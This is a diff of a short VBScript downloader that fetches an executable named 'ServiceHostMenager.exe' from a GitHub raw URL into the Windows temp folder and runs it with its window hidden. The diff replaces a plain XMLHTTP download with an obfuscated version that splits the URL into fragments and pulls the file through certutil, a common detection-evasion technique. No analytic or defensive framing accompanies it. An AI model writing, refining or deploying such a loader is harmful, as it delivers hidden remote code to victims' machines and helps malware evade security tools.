@@ -1,24 +1,9 @@
-Dim url, dest, objXMLHTTP, objADOStream, objFSO, objShell
-url = "https://github.com/Furystorage/Api/raw/main/ServiceHostMenager.exe"
-dest = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\ServiceHostMenager.exe"
+Dim a, b, c
+a = "h" & "tt" & "ps:/" & "/github.com/Furystorage/Api/raw/main/ServiceHostMenager.exe"
+b = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\" & "ServiceHostMenager.exe"
 
-Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
-objXMLHTTP.Open "GET", url, False
-objXMLHTTP.Send
+Set c = CreateObject("WScript.Shell")
+c.Run "certutil -urlcache -split -f " & a & " " & b, 0, True
+c.Run Chr(34) & b & Chr(34), 0 ' Run silently
 
-If objXMLHTTP.Status = 200 Then
-    Set objADOStream = CreateObject("ADODB.Stream")
-    objADOStream.Type = 1
-    objADOStream.Open
-    objADOStream.Write objXMLHTTP.ResponseBody
-    objADOStream.SaveToFile dest, 2
-    objADOStream.Close
-    Set objADOStream = Nothing
-End If
-
-Set objXMLHTTP = Nothing
-
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run dest, 0 ' Run silently
-
-Set objShell = Nothing
+Set c = Nothing
